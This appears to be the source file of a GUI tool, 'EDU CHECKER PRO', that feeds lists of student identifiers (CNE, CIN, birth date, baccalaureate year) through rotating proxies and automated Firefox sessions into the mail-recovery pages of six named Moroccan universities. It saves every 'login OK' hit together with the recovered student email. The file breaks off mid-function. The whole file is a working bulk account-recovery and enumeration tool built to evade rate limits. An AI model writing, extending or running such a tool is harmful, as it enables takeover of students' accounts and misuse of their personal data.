"""
EDU CHECKER PRO — Multi-University Engine, Proxy Quarantine, Diagnostic Logs & Direct Browser Show/Hide Mode
Strict Incognito Isolation & Full Context Destruction per Combo. Session-Based File Export & Direct University Path.
"""

import sys
import os
import threading
import queue
import json
import tempfile
import shutil
import traceback
import platform
import re
import ipaddress
import time
import uuid
import inspect
from pathlib import Path
from datetime import datetime
import random

from PySide6.QtCore import QThread, Signal, QTimer, Qt, QRectF
from PySide6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QFrame,
    QVBoxLayout, QHBoxLayout, QGridLayout, QLabel, QPushButton,
    QFileDialog, QLineEdit, QSpinBox, QComboBox,
    QTableWidget, QTableWidgetItem, QHeaderView,
    QPlainTextEdit, QMessageBox, QInputDialog, QDialog, QSlider,
)

from PySide6.QtGui import QPixmap, QPainter, QColor, QFont
from playwright.sync_api import sync_playwright
import openpyxl

root_path = Path(__file__).resolve().parent.parent
if str(root_path) not in sys.path:
    sys.path.insert(0, str(root_path))

from integrations.proxy_runtime import ProxyRuntime
from integrations.proxy_pool import ProxyPool
from integrations.proxy_only_gui import ProxyOnlyWindow

UNIVERSITY_URLS = {
    "UIT": "https://recupmail.uit.ac.ma/",
    "UMI": "https://my.umi.ac.ma/#/myumi/login",
    "UCA": "https://e-student.uca.ma/student/MailRecovery",
    "UMP": "http://recupmail.ump.ma/",
    "UAE": "https://recupmail.uae.ac.ma/",
    "USMBA": "http://messagerie.usmba.ac.ma/"
}

ENGINES = {}
try:
    from integrations.uit import UITEngine, LoginState
    ENGINES["UIT"] = UITEngine
except ImportError:
    UITEngine = None
    LoginState = None

try:
    from integrations.umi import UMIEngine
    ENGINES["UMI"] = UMIEngine
except ImportError:
    pass

try:
    from integrations.uca import UCAEngine
    ENGINES["UCA"] = UCAEngine
except ImportError:
    pass

try:
    from integrations.ump import UMPEngine
    ENGINES["UMP"] = UMPEngine
except ImportError:
    pass

try:
    from integrations.uae import UAEEngine
    ENGINES["UAE"] = UAEEngine
except ImportError:
    pass

try:
    from integrations.usmba import USMBAEngine
    ENGINES["USMBA"] = USMBAEngine
except ImportError:
    pass

FIREFOX_VIEWPORT = {"width": 1024, "height": 768}

STYLE = """
QMainWindow, QWidget {
    background: #30363B;
    color: #EDF2F3;
    font: 10px 'Segoe UI';
}
QFrame#panel {
    background: #3B4349;
    border: 1px solid #5B6870;
    border-radius: 7px;
}
QLabel { background: transparent; }
QLabel#section {
    color: #DCEAF0;
    font-weight: 700;
    font-size: 11px;
}
QPushButton {
    background: #535F66;
    color: #F2F5F6;
    border: 1px solid #75828A;
    border-radius: 5px;
    padding: 3px 7px;
    min-height: 18px;
}
QPushButton:hover {
    background: #657680;
    border-color: #8CC7E8;
}
QPushButton:pressed { background: #46535A; }
QPushButton:disabled {
    background: #434B51;
    color: #9FAAB0;
    border-color: #59636A;
}
QPushButton#orange {
    background: #A6D09E;
    color: #233026;
    border: 1px solid #A6D09E;
    font-weight: 750;
    font-size: 11px;
}
QPushButton#orange:hover { background: #B7DFB0; }
QPushButton#stop {
    background: #57474A;
    color: #FFD4D0;
    border: 1px solid #997175;
    font-weight: 650;
}
QPushButton#show {
    background: #535F66;
    color: #EDF2F3;
    border: 1px solid #75828A;
    font-weight: 650;
}
QPushButton#show:checked {
    background: #315845;
    color: #C7F0D1;
    border: 1px solid #74B98C;
    font-weight: 750;
}
QLineEdit, QComboBox, QSpinBox {
    background: #293137;
    color: #F0F3F4;
    border: 1px solid #75828A;
    border-radius: 5px;
    padding: 3px 6px;
    min-height: 18px;
}
QTableWidget, QPlainTextEdit {
    background: #2C353B;
    color: #EDF2F3;
    border: 1px solid #64737B;
    border-radius: 5px;
}
QHeaderView::section {
    background: #46535B;
    color: #E7F0F3;
    border: none;
    border-bottom: 1px solid #71818A;
    padding: 4px;
    font-weight: 650;
}
"""

class RuntimeThread(QThread):
    result_signal = Signal(object)
    progress_signal = Signal(int, int)
    log_signal = Signal(str)

    def __init__(self, lines, proxy_pool):
        super().__init__()
        self.lines = lines
        self.runtime = ProxyRuntime(
            on_result=self.result_signal.emit,
            on_progress=self.progress_signal.emit,
            max_workers=5,
            proxy_pool=proxy_pool,
        )

    def stop(self):
        self.runtime.stop()

    def run(self):
        self.log_signal.emit("[RUNTIME] Starting proxy verification...")
        self.runtime.scan(self.lines)
        self.log_signal.emit("[RUNTIME] Verification finished.")


class UniversityWorker(QThread):
    status_signal = Signal(int, str, str)
    result_signal = Signal(str, str, str, str)
    log_signal = Signal(str)
    diag_signal = Signal(str, str, dict)

    def __init__(self, browser_id, proxy, protocol, expected_ip,
                 lease=None, direct=False, combo_queue=None, selected_engine="UIT", headless=True):
        super().__init__()
        self.browser_id = browser_id
        self.proxy = proxy
        self.protocol = protocol
        self.expected_ip = expected_ip
        self.lease = lease
        self.direct = direct
        self.combo_queue = combo_queue
        self.selected_engine = selected_engine
        self.headless = headless
        self.stop_event = threading.Event()
        self.needs_quarantine = False

    def stop(self):
        self.stop_event.set()

    def run(self):
        label = f"Browser #{self.browser_id}"
        proxy_label = "DIRECT" if self.direct else self.proxy.label
        target_url = UNIVERSITY_URLS.get(self.selected_engine, UNIVERSITY_URLS["UIT"])

        self.diag_signal.emit("worker", "thread_started", {"browser_id": self.browser_id, "engine": self.selected_engine, "proxy": proxy_label})

        if self.combo_queue is None or self.combo_queue.empty():
            return

        try:
            combo = self.combo_queue.get(timeout=1.0)
        except queue.Empty:
            return

        cne = str(combo[0]).strip() if len(combo) > 0 and combo[0] else ""
        cni = str(combo[1]).strip() if len(combo) > 1 and combo[1] else ""
        dob = str(combo[2]).strip() if len(combo) > 2 and combo[2] else ""
        bac = str(combo[3]).strip() if len(combo) > 3 and combo[3] else ""

        masked_cne = cne[:3] + "***" if len(cne) > 3 else "***"
        self.status_signal.emit(self.browser_id, f"CHECKING {masked_cne}", proxy_label)
        mode_str = "VISIBLE (SHOW)" if not self.headless else "BACKGROUND (HIDE)"
        self.log_signal.emit(f"[{label}] Opening [{self.selected_engine}] in {mode_str} for CNE: {masked_cne}")
        self.diag_signal.emit("worker", "checking_combo", {"cne_masked": masked_cne, "engine": self.selected_engine, "mode": mode_str})

        proxy_config = None
        if not self.direct and self.proxy and self.protocol:
            proxy_config = self.proxy.playwright_config(self.protocol)

        res = {"status": "login_error", "extracted_email": None, "detail": "Engine not implemented"}
        
        with sync_playwright() as p:
            browser = None
            context = None
            try:
                launch_opts = {"headless": self.headless}
                if proxy_config:
                    launch_opts["proxy"] = proxy_config

                browser = p.firefox.launch(**launch_opts)
                
                context = browser.new_context(
                    viewport=FIREFOX_VIEWPORT,
                    ignore_https_errors=True,
                    java_script_enabled=True,
                    accept_downloads=False
                )
                page = context.new_page()

                self.diag_signal.emit("playwright", "navigating", {"url": target_url})
                page.goto(target_url, wait_until="domcontentloaded", timeout=45000)
                page.wait_for_timeout(1000)

                EngineClass = ENGINES.get(self.selected_engine)
                if EngineClass:
                    engine = EngineClass()
                    try:
                        self.diag_signal.emit("engine", "invoking", {"engine_name": self.selected_engine})
                        if self.selected_engine == "UMI":
                            res = engine.run_workflow(page, cne, cni, dob, bac)
                        elif self.selected_engine in ["UIT", "UAE", "USMBA"]:
                            res = engine.run_workflow(page, cne, cni, dob)
                        elif self.selected_engine in ["UCA", "UMP"]:
                            res = engine.run_workflow(page, cne, dob)
                        else:
                            res = engine.run_workflow(page, cne)
                        self.diag_signal.emit("engine", "success", {"result": str(res)})
                    except Exception as engine_err:
                        tb = traceback.format_exc()
                        err_msg = f"{type(engine_err).__name__}: {str(engine_err)}"
                        self.diag_signal.emit("engine", "exception", {"error": err_msg, "traceback": tb})
                        res = {"status": "login_error", "extracted_email": None, "detail": f"Engine error: {err_msg}"}
                else:
                    res = {"status": "login_error", "extracted_email": None, "detail": f"Engine for {self.selected_engine} not found"}

            except Exception as play_err:
                tb = traceback.format_exc()
                err_msg = f"{type(play_err).__name__}: {str(play_err)}"
                self.diag_signal.emit("playwright", "exception", {"error": err_msg, "traceback": tb})
                res = {"status": "login_error", "extracted_email": None, "detail": f"Execution error: {err_msg}"}
            finally:
                try:
                    if context:
                        context.close()
                except Exception:
                    pass
                try:
                    if browser:
                        browser.close()
                except Exception:
                    pass

        status = res["status"]
        detail = res["detail"]

        if status == "site_error" and "timeout" in detail.lower():
            self.needs_quarantine = True

        display_status = "LOGIN OK" if status == "login_ok" else "LOGIN ERROR"
        display_detail = res["extracted_email"] if status == "login_ok" else detail

        self.result_signal.emit(cne, cni, display_status, display_detail)
        self.log_signal.emit(f"[{label}] Result -> {display_status} [{display_detail}]")
        self.diag_signal.emit("worker", "result_emitted", {"status": display_status, "detail": str(display_detail)})
        self.combo_queue.task_done()


class EduCheckerWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("EDU CHECKER PRO — Multi-University Engine & Strict Incognito Isolation")
        self.resize(920, 630)
        self.setMinimumSize(820, 560)
        self.setStyleSheet(STYLE)

        self.proxies = []
        self.results = []
        self.workers = []
        self.runtime_thread = None
        self.proxy_monitor = None
        self.runtime_history = []
        self.runtime_last_progress = (0, 0)
        self.runtime_scan_done = False
        self.stopping = False
        self.direct_mode = False

        self.proxy_pool = ProxyPool()
        self.combo_queue = queue.Queue()
        self.total_loaded_combos = 0
        self._umi_default_bac = ""

        self.browser_status = []
        self.browser_show_buttons = []
        self.last_export_path = None
        self._export_session_token = None
        self._export_paths = {}

        self.loaded_count = 0
        self.checked_count = 0
        self.good_count = 0
        self.bad_count = 0

        self._diagnostic_dir = tempfile.TemporaryDirectory(prefix="edu_checker_diag_")
        self._diag_path = Path(self._diagnostic_dir.name)
        self._diag_jsonl = self._diag_path / "diagnostics.jsonl"
        self._diag_txt = self._diag_path / "diagnostics.txt"
        self._diag_count = 0
        self._diag_secrets = set()

        self.build_ui()
        self.diagnostic("system", "startup", {"python": sys.version.split()[0], "os": platform.platform()})
        self.log("Edu Checker Pro initialized successfully (IDLE State).")

    def panel(self, layout=None):
        panel = QFrame(objectName="panel")
        panel.setLayout(layout or QVBoxLayout())
        return panel

    def _sanitize(self, value):
        text = str(value)
        for secret in sorted(self._diag_secrets, key=len, reverse=True):
            if secret:
                text = text.replace(secret, "[REDACTED]")
        return text

    def diagnostic(self, component, event, fields=None):
        try:
            if fields is None:
                fields = {}
            entry = {
                "time": datetime.now().astimezone().isoformat(timespec="milliseconds"),
                "component": component, "event": event,
                "data": {str(k): self._sanitize(v) for k, v in fields.items()}
            }
            with self._diag_jsonl.open("a", encoding="utf-8") as f:
                f.write(json.dumps(entry, ensure_ascii=False) + "\n")
            with self._diag_txt.open("a", encoding="utf-8") as f:
                f.write(f"{entry['time']} [{component}] {event} " + json.dumps(entry["data"], ensure_ascii=False) + "\n")
            self._diag_count += 1
        except OSError:
            pass

    def export_diagnostics(self):
        dest, _ = QFileDialog.getSaveFileName(
            self, "Export diagnostics",
            str(Path.home() / "Desktop" / "edu_diagnostics.jsonl"),
            "JSON Lines (*.jsonl);;Text (*.txt)")
        if not dest:
            return
        source = self._diag_txt if dest.lower().endswith(".txt") else self._diag_jsonl
        try:
            shutil.copyfile(source, dest)
            self.log("[DIAGNOSTIC] Exported to: " + dest)
        except OSError as exc:
            QMessageBox.warning(self, "Export failed", str(exc))

    def show_diagnostics(self):
        dialog = QMessageBox(self)
        dialog.setWindowTitle("Diagnostic Logs")
        dialog.setText(f"Temporary diagnostic events: {self._diag_count}\nAutomatically deleted on program exit.")
        export_button = dialog.addButton("Export JSONL / TXT", QMessageBox.ButtonRole.ActionRole)
        open_button = dialog.addButton("Open temporary folder", QMessageBox.ButtonRole.ActionRole)
        dialog.addButton("Close", QMessageBox.ButtonRole.RejectRole)
        dialog.exec()
        if dialog.clickedButton() == export_button:
            self.export_diagnostics()
        elif dialog.clickedButton() == open_button:
            if sys.platform == "win32":
                os.startfile(str(self._diag_path))

    def log(self, message):
        self.diagnostic("checker", "log", {"message": message})
        self.logs.appendPlainText(f"[{datetime.now():%H:%M:%S}]  {message}")

    def build_ui(self):
        root = QWidget()
        self.setCentralWidget(root)

        v = QVBoxLayout(root)
        v.setContentsMargins(9, 8, 9, 8)
        v.setSpacing(5)

        toolbar = QHBoxLayout()
        toolbar.setSpacing(5)

        for name, function in [
            ("■  Stop", self.stop),
            ("⟳  Restart", self.restart),
            ("▤  To File", self.open_file),
            ("◎  Proxy Runtime", self.open_proxy_monitor),
            ("▤  Diagnostic Logs", self.show_diagnostics),
        ]:
            button = QPushButton(name)
            button.setMinimumWidth(105)
            if name.startswith("■"):
                button.setObjectName("stop")
            if "To File" in name:
                button.setObjectName("tofile")
            button.clicked.connect(function)
            toolbar.addWidget(button)

        toolbar.addStretch()
        v.addLayout(toolbar)

        engine_row = QHBoxLayout()
        engine_row.addWidget(QLabel("Select University Engine:"))
        self.engine_selector = QComboBox()
        self.engine_selector.addItem("-- Please Select University --")
        self.engine_selector.addItems(list(UNIVERSITY_URLS.keys()))
        self.engine_selector.setCurrentIndex(0)
        engine_row.addWidget(self.engine_selector, 1)
        v.addLayout(engine_row)

        for title, attribute, function in [
            ("▤   Source File (CNE:CNI:DOB)", "source_path", self.browse_source),
            ("▤   Proxy File", "proxy_path", self.browse_proxy),
        ]:
            row = QHBoxLayout()
            row.setSpacing(5)
            label = QLabel(title)
            label.setFixedWidth(160)
            row.addWidget(label)

            edit = QLineEdit()
            if attribute == "source_path":
                edit.setPlaceholderText("Select source combo file...")
            else:
                edit.setPlaceholderText("Select proxy text file...")

            setattr(self, attribute, edit)
            row.addWidget(edit, 1)

            button = QPushButton("▱  Explore")
            button.setObjectName("explore")
            button.setFixedWidth(84)
            button.clicked.connect(function)
            row.addWidget(button)
            v.addLayout(row)

        settings = QHBoxLayout()
        settings.setSpacing(6)
        settings.addWidget(QLabel("Threads"))

        self.threads = QSpinBox()
        self.threads.setRange(1, 10)
        self.threads.setValue(3)
        self.threads.valueChanged.connect(self.browser_cards)
        settings.addWidget(self.threads)
        settings.addSpacing(8)

        settings.addWidget(QLabel("Export Mode"))
        self.mode = QComboBox()
        self.mode.addItems(["TXT", "Excel (.xlsx)"])
        settings.addWidget(self.mode)
        settings.addStretch()

        self.start_btn = QPushButton("▶  START")
        self.start_btn.setObjectName("orange")
        self.start_btn.setMinimumWidth(112)
        self.start_btn.clicked.connect(self.start)
        settings.addWidget(self.start_btn)
        v.addLayout(settings)

        counter = QHBoxLayout()
        counter.setSpacing(5)
        self.loaded_label = QLabel("Loaded: 0")
        self.working_label = QLabel("Valid: 0")
        self.bad_label = QLabel("Invalid: 0")
        self.type_label = QLabel("Protocol: AUTO")

        for widget in [QLabel("▤   Proxy Counter"), self.loaded_label, self.working_label, self.bad_label, self.type_label]:
            counter.addWidget(widget)
            counter.addStretch()

        v.addWidget(self.panel(counter))

        pool_row = QHBoxLayout()
        pool_row.setSpacing(5)
        self.pool_label = QLabel("Proxy Pool: 0 READY")
        self.progress_label = QLabel("Runtime: IDLE")
        pool_row.addWidget(self.pool_label)
        pool_row.addStretch()
        pool_row.addWidget(self.progress_label)
        v.addWidget(self.panel(pool_row))

        browser_box = QVBoxLayout()
        browser_box.setContentsMargins(7, 6, 7, 6)
        browser_box.setSpacing(5)
        browser_box.addWidget(QLabel("◎   Live Browsers", objectName="section"))

        self.browser_row = QGridLayout()
        self.browser_row.setHorizontalSpacing(5)
        self.browser_row.setVerticalSpacing(5)
        browser_box.addLayout(self.browser_row)

        v.addWidget(self.panel(browser_box))
        self.browser_cards(self.threads.value())

        panes = QHBoxLayout()
        panes.setSpacing(6)

        for title, is_results in [("Results", True), ("▤   Logs", False)]:
            column = QVBoxLayout()
            column.setContentsMargins(7, 6, 7, 6)

            header = QHBoxLayout()
            
            if is_results:
                header.addWidget(QLabel("Results", objectName="section"))
                header.addSpacing(10)
                
                self.badge_combo = QLabel("Combo : 0 / 0")
                self.badge_combo.setStyleSheet("""
                    background: #3B4349;
                    color: #C0C0C0;
                    border: 1px solid #75828A;
                    border-radius: 4px;
                    padding: 2px 8px;
                    font-weight: bold;
                """)
                header.addWidget(self.badge_combo)
                header.addSpacing(6)
                
                self.badge_ok = QLabel("Login OK : 0")
                self.badge_ok.setStyleSheet("""
                    background: #315845;
                    color: #C7F0D1;
                    border: 1px solid #74B98C;
                    border-radius: 4px;
                    padding: 2px 8px;
                    font-weight: bold;
                """)
                header.addWidget(self.badge_ok)
                header.addSpacing(6)

                self.badge_err = QLabel("Login Error : 0")
                self.badge_err.setStyleSheet("""
                    background: #57474A;
                    color: #FFD4D0;
                    border: 1px solid #997175;
                    border-radius: 4px;
                    padding: 2px 8px;
                    font-weight: bold;
                """)
                header.addWidget(self.badge_err)
            else:
                header.addWidget(QLabel(title, objectName="section"))
            
            header.addStretch()
            clear = QPushButton("♧  Clear")
            header.addWidget(clear)
            column.addLayout(header)

            if is_results:
                self.table = QTableWidget(0, 4)
                self.table.setHorizontalHeaderLabels(["CNE", "CIN", "Status", "Details / Email"])
                self.table.verticalHeader().setVisible(True)
                self.table.verticalHeader().setDefaultSectionSize(22)
                self.table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
                self.table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
                self.table.setAlternatingRowColors(True)
                column.addWidget(self.table)
                clear.clicked.connect(self.clear_results)
            else:
                self.logs = QPlainTextEdit()
                self.logs.setReadOnly(True)
                self.logs.setMaximumBlockCount(1000)
                column.addWidget(self.logs)
                clear.clicked.connect(self.logs.clear)

            panes.addWidget(self.panel(column), 1)

        v.addLayout(panes, 1)

    def update_results_header_display(self):
        total_initial = self.total_loaded_combos
        remaining_in_queue = self.combo_queue.qsize()
        current_checked = max(0, total_initial - remaining_in_queue)
        
        login_ok = sum(1 for r in self.results if r[2] == 'LOGIN OK')
        login_error = sum(1 for r in self.results if r[2] != 'LOGIN OK')
        
        if hasattr(self, 'badge_combo'):
            self.badge_combo.setText(f"Combo : {current_checked} / {total_initial}")
        if hasattr(self, 'badge_ok'):
            self.badge_ok.setText(f"Login OK : {login_ok}")
        if hasattr(self, 'badge_err'):
            self.badge_err.setText(f"Login Error : {login_error}")

    def open_proxy_monitor(self):
        if self.proxy_monitor is None:
            self.proxy_monitor = ProxyOnlyWindow(self)
            self.proxy_monitor.reset(self.runtime_last_progress[1])
            for result in self.runtime_history:
                self.proxy_monitor.add_result(result)
            self.proxy_monitor.set_progress(*self.runtime_last_progress)
            if self.runtime_scan_done:
                self.proxy_monitor.mark_finished()
        self.proxy_monitor.show()
        self.proxy_monitor.raise_()
        self.proxy_monitor.activateWindow()

    def browser_cards(self, count):
        while self.browser_row.count():
            item = self.browser_row.takeAt(0)
            if item.widget():
                item.widget().deleteLater()

        self.browser_status = []
        self.browser_show_buttons = []
        self._browser_buttons = {}
        self._browser_cards = {}

        for index in range(count):
            browser_id = index + 1
            inner = QVBoxLayout()
            inner.setContentsMargins(6, 5, 6, 5)
            inner.setSpacing(3)

            top = QHBoxLayout()
            top.addWidget(QLabel(f"🌐  Browser #{browser_id}", objectName="section"))
            top.addStretch()

            show_btn = QPushButton("Show")
            show_btn.setObjectName("show")
            show_btn.setCheckable(True)
            show_btn.setChecked(False)
            show_btn.setFixedWidth(52)
            show_btn.setToolTip("Toggle ON to show real Firefox window for this slot, OFF for background hide")
            
            show_btn.clicked.connect(
                lambda checked, bid=browser_id: self.log(f"[UI] Browser #{bid} show mode -> {checked}")
            )

            top.addWidget(show_btn)
            inner.addLayout(top)

            location = QLabel("⌖  Proxy: Waiting")
            status = QLabel("Status: WAITING")
            location.setWordWrap(True)
            status.setWordWrap(True)
            inner.addWidget(location)
            inner.addWidget(status)

            card = self.panel(inner)
            card.setMinimumWidth(132)
            card.setMaximumWidth(260)
            self.browser_row.addWidget(card, index // 5, index % 5)
            self._browser_cards[browser_id] = card

            self.browser_status.append((location, status))
            self.browser_show_buttons.append(show_btn)
            self._browser_buttons[browser_id] = show_btn

    def browse_source(self):
        path, _ = QFileDialog.getOpenFileName(self, "Choose source file", "", "Text files (*.txt *.csv);;All files (*)")
        if path:
            self.source_path.setText(path)
            self.load_source_combos(path)

    def load_source_combos(self, path_str):
        path = Path(path_str)
        if not path.is_file():
            return
        lines = path.read_text(encoding="utf-8-sig", errors="replace").splitlines()
        
        while not self.combo_queue.empty():
            try:
                self.combo_queue.get_nowait()
                self.combo_queue.task_done()
            except queue.Empty:
                break

        valid_count = 0
        selected_uni = self.engine_selector.currentText()
        umi_default_bac = getattr(self, '_umi_default_bac', '') if selected_uni == "UMI" else ''
        
        for line in lines:
            line = line.strip()
            if not line or line.startswith("#") or "CNE" in line.upper() or "MASSAR" in line.upper() or "CARTE" in line.upper() or "DATE" in line.upper() or "BAC" in line.upper():
                continue
            parts = [p.strip() for p in line.split(":") if p.strip()]
            
            cne, cni, dob, bac = "", "", "", ""
            
            if len(parts) == 2:
                cne = parts[0]
                dob = parts[1]
            elif len(parts) == 3:
                cne = parts[0]
                cni = parts[1]
                dob = parts[2]
            elif len(parts) >= 4:
                cne = parts[0]
                cni = parts[1]
                dob = parts[2]
                bac = parts[3]
            
            if selected_uni == "UMI" and not bac:
                bac = umi_default_bac
            
            if cne:
                self.combo_queue.put((cne, cni, dob, bac))
                valid_count += 1
                    
        self.total_loaded_combos = valid_count
        self.diagnostic("checker", "combos_loaded", {"count": valid_count, "university": selected_uni})
        self.log(f"Loaded {valid_count} combos for [{selected_uni}] from source file.")
        self.loaded_label.setText(f"Loaded: {valid_count}")
        self.update_results_header_display()

    def browse_proxy(self):
        path, _ = QFileDialog.getOpenFileName(self, "Choose proxy list", "", "Text files (*.txt *.csv);;All files (*)")
        if path:
            self.proxy_path.setText(path)
            self.load_proxies()

    def load_proxies(self):
        path = Path(self.proxy_path.text().strip())
        if not path.is_file():
            self.log("Proxy file not found.")
            return []
        lines = path.read_text(encoding="utf-8-sig", errors="replace").splitlines()
        lines = [line.strip() for line in lines if line.strip() and not line.lstrip().startswith("#")]
        self.loaded_count = len(lines)
        self.loaded_label.setText(f"Loaded: {len(lines)}")
        self.log(f"Loaded {len(lines)} proxy entries.")
        return lines

    def start(self):
        selected_uni = self.engine_selector.currentText()
        if not selected_uni or selected_uni.startswith("--"):
            QMessageBox.warning(self, "University Selection Required", "⚠️ Please select a valid University Engine from the dropdown menu before starting!")
            return

        if selected_uni == "UMI":
            default_bac, ok = QInputDialog.getText(
                self, "UMI Session Baccalaureate Year", 
                "أدخل سنة الباكالوريا الافتراضية الخاصة بـ UMI لهذه الجلسة (مثال: 2022):", 
                QLineEdit.Normal, "2022"
            )
            if not ok:
                return  
            self._umi_default_bac = default_bac.strip()
            self.log(f"[UMI SESSION] Default Baccalaureate Year set to: {self._umi_default_bac}")
        else:
            self._umi_default_bac = ""

        source_file = self.source_path.text().strip()
        if source_file and Path(source_file).is_file():
            self.load_source_combos(source_file)

        if self.combo_queue.empty():
            QMessageBox.warning(self, "Source File", "Please select a valid source file containing valid combos.")
            return

        if self.runtime_thread and self.runtime_thread.isRunning():
            return

        if any(worker.isRunning() for worker in self.workers):
            return

        proxy_path_text = self.proxy_path.text().strip()
        self.direct_mode = not bool(proxy_path_text)
        if self.direct_mode:
            answer = QMessageBox.question(
                self, "Continue without proxy?",
                "Are you sure you want to continue without proxy?\n\nFirefox will use this computer's normal network connection.",
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                QMessageBox.StandardButton.No,
            )
            if answer != QMessageBox.StandardButton.Yes:
                self.log("[DIRECT] Cancelled by user.")
                return
            lines = []
        else:
            if not Path(proxy_path_text).is_file():
                QMessageBox.warning(self, "Proxy File", "Selected proxy file does not exist.")
                return
            lines = self.load_proxies()
            if not lines:
                QMessageBox.warning(self, "Proxy File", "The selected proxy file is empty.")
                return

        self.results = []
        self.table.setRowCount(0)
        self.last_export_path = None
        self._export_session_token = datetime.now().strftime("%Y%m%d_%H%M%S") + "_" + uuid.uuid4().hex[:6]
        self._export_paths = {}
        self.threads.setEnabled(False)

        self.proxy_pool.close()
        self.proxy_pool = ProxyPool()

        self.checked_count = 0
        self.good_count = 0
        self.bad_count = 0
        self.runtime_history = []
        self.runtime_last_progress = (0, len(lines))
        self.runtime_scan_done = False
        self.stopping = False
        if self.proxy_monitor is not None:
            self.proxy_monitor.reset(len(lines))

        self.update_counters()
        self.update_results_header_display()
        self.start_btn.setEnabled(False)

        for index in range(len(self.browser_status)):
            self.update_browser_status(index + 1, "WAITING", "No proxy assigned")

        if self.direct_mode:
            self.runtime_scan_done = True
            self.progress_label.setText("Runtime: SKIPPED (DIRECT)")
            self.type_label.setText("Protocol: DIRECT")
            self.log("[DIRECT] User confirmed normal network connection.")
            self.start_browser_sessions()
            return

        self.type_label.setText("Protocol: AUTO")
        self.runtime_thread = RuntimeThread(lines, self.proxy_pool)
        self.runtime_thread.result_signal.connect(self.runtime_result)
        self.runtime_thread.progress_signal.connect(self.runtime_progress)
        self.runtime_thread.log_signal.connect(self.log)
        self.runtime_thread.finished.connect(self.runtime_finished)
        self.runtime_thread.start()

        self.log("[CHECKER] Runtime started. Browsers remain in WAITING.")

    def runtime_result(self, result):
        self.runtime_history.append(result.copy())
        if self.proxy_monitor is not None:
            self.proxy_monitor.add_result(result)
        self.checked_count += 1

        status = result["status"]
        proxy = result.get("proxy")

        if status == "GOOD" and proxy:
            self.good_count += 1
            self.start_browser_sessions()
        elif status in ("BAD", "AUTH_FAILED"):
            self.bad_count += 1

        self.update_counters()

    def runtime_progress(self, completed, total):
        self.runtime_last_progress = (completed, total)
        if self.proxy_monitor is not None:
            self.proxy_monitor.set_progress(completed, total)
        self.progress_label.setText(f"Runtime: {completed}/{total}")

    def runtime_finished(self):
        self.runtime_scan_done = True
        if self.proxy_monitor is not None:
            self.proxy_monitor.mark_finished()
        self.log("[RUNTIME] Proxy verification finished.")
        self.progress_label.setText("Runtime: COMPLETE")
        self.start_browser_sessions()
        if not self.workers and (self.stopping or self.good_count == 0):
            self.start_btn.setEnabled(True)
            self.threads.setEnabled(True)

    def start_browser_sessions(self):
        if self.stopping:
            return
        capacity = self.threads.value()
        selected_uni = self.engine_selector.currentText()
        used_ids = {w.browser_id for w in self.workers}
        
        for browser_id in range(1, capacity + 1):
            if browser_id in used_ids:
                continue
            
            index = browser_id - 1
            show_btn = self.browser_show_buttons[index] if 0 <= index < len(self.browser_show_buttons) else None
            is_shown = show_btn.isChecked() if show_btn else False
            headless_mode = not is_shown

            if self.direct_mode:
                lease = None
                worker = UniversityWorker(
                    browser_id, None, "DIRECT",
                    "Not verified", direct=True, combo_queue=self.combo_queue,
                    selected_engine=selected_uni, headless=headless_mode
                )
            else:
                lease = self.proxy_pool.acquire(f"browser-{browser_id}", timeout=0)
                if lease is None:
                    continue
                worker = UniversityWorker(
                    browser_id, lease.proxy, lease.protocol,
                    lease.exit_ip, lease=lease, combo_queue=self.combo_queue,
                    selected_engine=selected_uni, headless=headless_mode
                )
            worker.status_signal.connect(self.update_browser_status)
            worker.result_signal.connect(self.handle_result)
            worker.log_signal.connect(self.log)
            worker.diag_signal.connect(self.diagnostic)
            worker.finished.connect(lambda w=worker: self.worker_finished(w))
            self.workers.append(worker)
            used_ids.add(browser_id)
            
            card = self._browser_cards.get(browser_id)
            if card is not None:
                card.show()
            worker.start()
        self.update_counters()

    def update_browser_status(self, browser_id, status, proxy_info):
        index = browser_id - 1
        if 0 <= index < len(self.browser_status):
            location, status_label = self.browser_status[index]
            location.setText(f"⌖ Proxy: {proxy_info[:28]}")
            status_label.setText(f"Status: {status}")

    def handle_result(self, cne, cni, status, detail):
        record = (cne, cni, status, detail)
        self.results.append(record)
        self.diagnostic("checker", "result_received", {"cne": cne, "status": status, "detail": detail})

        row = self.table.rowCount()
        self.table.insertRow(row)
        for column, value in enumerate(record):
            self.table.setItem(row, column, QTableWidgetItem(str(value)))

        self.auto_save_classified_result(record)
        self.update_results_header_display()

    def auto_save_classified_result(self, record):
        try:
            if getattr(sys, "frozen", False):
                base = Path(sys.executable).resolve().parent
            else:
                base = Path(__file__).resolve().parent.parent

            selected_uni = self.engine_selector.currentText()
            parent_dir = base / "output" / "Edu_Checker" / selected_uni
            status = record[2]

            session_token = getattr(self, "_export_session_token", None)
            if not session_token:
                session_token = datetime.now().strftime("%Y%m%d_%H%M%S")

            if status == "LOGIN OK":
                sub_folder = "login_ok"
                content = f"{record[3]} : login_ok"
                filename = f"result_ok_{session_token}.txt"
            else:
                sub_folder = "login_error"
                content = f"{record[0]} : {record[3]}"
                filename = f"result_error_{session_token}.txt"

            directory = parent_dir / sub_folder
            directory.mkdir(parents=True, exist_ok=True)
            path = directory / filename

            with path.open("a", encoding="utf-8") as f:
                f.write(content + "\n")

            return path
        except Exception as exc:
            self.log(f"[AUTO-SAVE ERROR] {exc}")
            return None

    def update_counters(self):
        self.working_label.setText(f"Valid: {sum(1 for r in self.results if r[2] == 'LOGIN OK')}")
        self.bad_label.setText(f"Invalid: {sum(1 for r in self.results if r[2] != 'LOGIN OK')}")
        self.pool_label.setText(
            ("Proxy Pool: BYPASSED (DIRECT)" if self.direct_mode
             else f"Proxy Pool: {self.proxy_pool.stats()['available']} READY")
        )
        self.update_results_header_display()

    def worker_finished(self, worker):
        if worker.lease is not None:
            if getattr(worker, "needs_quarantine", False):
                self.proxy_pool.quarantine(worker.lease, 900)
                self.log(f"[PROXY COOLDOWN] Proxy {worker.proxy.label} placed in quarantine for 15 minutes.")
            else:
                self.proxy_pool.release(worker.lease)

        if worker in self.workers:
            self.workers.remove(worker)

        self.update_browser_status(worker.browser_id, "RECYCLING", "Waiting for next proxy")
        card = self._browser_cards.get(worker.browser_id)
        if card is not None:
            card.hide()
        self.log(f"[Browser #{worker.browser_id}] Session finished; refreshing slot.")

        if not self.stopping and not self.combo_queue.empty():
